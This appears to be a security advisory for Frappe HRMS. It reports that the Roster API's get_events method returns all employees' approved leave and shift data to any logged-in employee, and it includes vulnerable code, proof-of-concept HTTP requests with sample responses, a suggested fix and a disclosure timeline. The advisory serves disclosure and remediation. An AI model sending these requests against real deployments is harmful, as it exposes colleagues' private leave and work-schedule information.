https://github.com/frappe/hrms

# Cross-Employee Leave and Shift Data Exposure via Roster API

### Summary
An authenticated employee with no special privileges can enumerate the approved leave applications and shift assignments of every other employee in the organization by calling the Roster API endpoint. The `get_events` method in `hrms/api/roster.py` queries leave and shift data using Frappe's raw query builder (`frappe.qb`) without applying Frappe's user-permission scoping, so the Employee-scoped user permissions that normally restrict each user to their own HR records are bypassed. An attacker learns when colleagues are on leave, the leave types used, and their shift schedules -- information the Employee Self Service portal otherwise correctly protects.
### Details
Frappe's user permission system works through two mechanisms: role permissions (which roles can read a doctype) and user permissions (which specific records a user can access). When using `frappe.get_list`, both layers are applied automatically. When using `frappe.qb` directly, only the database-level query runs; user permissions are not injected.
In `hrms/api/roster.py`, the `get_leaves` function (called internally from the whitelisted `get_events`) checks only the role-level permission:
```python
# hrms/api/roster.py lines 271-300
def get_leaves(month_start, month_end, employee_filters):
    _validate_employee_filters(employee_filters)
    LeaveApplication = frappe.qb.DocType("Leave Application")
    Employee = frappe.qb.DocType("Employee")
    frappe.has_permission("Leave Application", "read", throw=True)  # role-only check
    query = (
        frappe.qb.select(
            LeaveApplication.name.as_("leave"),
            LeaveApplication.employee,
            LeaveApplication.leave_type,
            LeaveApplication.from_date,
            LeaveApplication.to_date,
        )
        .from_(LeaveApplication)
        .left_join(Employee)
        .on(LeaveApplication.employee == Employee.name)
        .where(
            (LeaveApplication.docstatus == 1)
            & (LeaveApplication.status == "Approved")
            & (LeaveApplication.from_date <= month_end)
            & (LeaveApplication.to_date >= month_start)
        )
    )
    for filter in employee_filters:
        query = query.where(Employee[filter] == employee_filters[filter])
    return group_by_employee(query.run(as_dict=True))  # returns ALL employees
```
The `Employee` role permission on the `Leave Application` doctype has `read=1` with `if_owner=0` (no owner restriction). The call `frappe.has_permission("Leave Application", "read", throw=True)` therefore passes for any user with the Employee role. The subsequent `frappe.qb` query then returns every approved leave application in the requested date range with no per-user scoping.
The same pattern exists in `get_shifts` (lines 303-344), which returns all submitted shift assignments via `frappe.qb` with only a role-level permission check.
Contrast this with correctly-gated adjacent endpoints such as `get_leave_applications` (line 336 in `hrms/api/__init__.py`), which uses `frappe.get_list` and therefore inherits the user permission filtering that restricts Bob to records where `employee=HR-EMP-00002`.
The direct document access API correctly blocks cross-employee access:
```
GET /api/resource/Leave Application/HR-LAP-2026-00001
-> 403 PermissionError (for non-owner)
```
The roster endpoint does not:
```
POST /api/method/hrms.api.roster.get_events
{"month_start":"2026-06-01","month_end":"2026-06-30","employee_filters":{},"shift_filters":{}}
-> 200 with every other employee's leave and shift data
```
### PoC
Prerequisites:
- A running Frappe HRMS instance
- Two employee accounts: Alice (HR-EMP-00001, emp_a@test.com) and Bob (HR-EMP-00002, emp_b@test.com), each with the Employee role and a corresponding Employee record linked via `user_id`
- Alice has an approved (docstatus=1, status=Approved) Leave Application and a submitted Shift Assignment
Step 1 -- Log in as Bob (the attacker):
```
POST /api/method/login HTTP/1.1
Host: hrms.example.com
Content-Type: application/json
{"usr":"emp_b@test.com","pwd":"Test@12345"}
```
Response: `{"message":"Logged In","home_page":"desk","full_name":"Bob Jones"}`
Step 2 -- Call the roster endpoint with an empty date range covering the current month:
```
POST /api/method/hrms.api.roster.get_events HTTP/1.1
Host: hrms.example.com
Content-Type: application/json
Cookie: <Bob's session cookie>
{"month_start":"2026-06-01","month_end":"2026-06-30","employee_filters":{},"shift_filters":{}}
```
Response (Bob sees Alice's data):
```json
{
  "message": {
    "HR-EMP-00001": [
      {
        "leave": "HR-LAP-2026-00001",
        "leave_type": "Casual Leave",
        "from_date": "2026-06-10",
        "to_date": "2026-06-11"
      },
      {
        "name": "HR-SHA-26-06-00001",
        "shift_type": "Morning Shift",
        "shift_location": null,
        "start_date": "2026-06-01",
        "end_date": null,
        "status": "Active",
        "start_time": "9:00:00",
        "end_time": "17:00:00",
        "color": "Blue"
      }
    ]
  }
}
```
Step 3 -- Confirm the adjacent protected endpoint correctly blocks access:
```
GET /api/resource/Leave Application/HR-LAP-2026-00001 HTTP/1.1
Host: hrms.example.com
Cookie: <Bob's session cookie>
```
Response: `{"exception":"frappe.exceptions.PermissionError", ...}` (HTTP 403)
The fix is to replace the `frappe.qb` queries in `get_leaves` and `get_shifts` with `frappe.get_list`, which automatically applies user permission filtering, or to explicitly add user-permission conditions to the query builder calls.
### Impact
Any authenticated user with the Employee role can read the approved leave records (employee ID, leave type, dates) and shift assignments (shift type, schedule, location) of all other employees across the organization. In organizations that treat leave reasons, medical leave frequency, or working patterns as confidential, this constitutes a meaningful privacy violation. The attacker needs only a standard employee account and no user interaction from the victim.


Confirmed on commit e9da8c33 (develop branch, 2026-06-02). The issue affects any deployment where employees have approved leaves or submitted shift assignments.


Suggested fix: Replace the frappe.qb calls in getleaves and getshifts with frappe.get_list, which applies user permission scoping automatically, or add explicit user-permission conditions to the query builder queries before running them.



## Disclosure:
 - 2 June 2026 - reported via email
 - 5 June 2026 - vendor fixed product, confirmed fix to be release along with advisory
 - 5 June 2026 - gave credit name
 - 17 September 2026 - followed up
 - 19 October 2026 - followed up
 - 17 November 2026 - no response; disclosed

<img width="1155" height="982" alt="image" src="https://github.com/user-attachments/assets/6556c711-a534-4d0d-bc8f-2eee9b062163" />
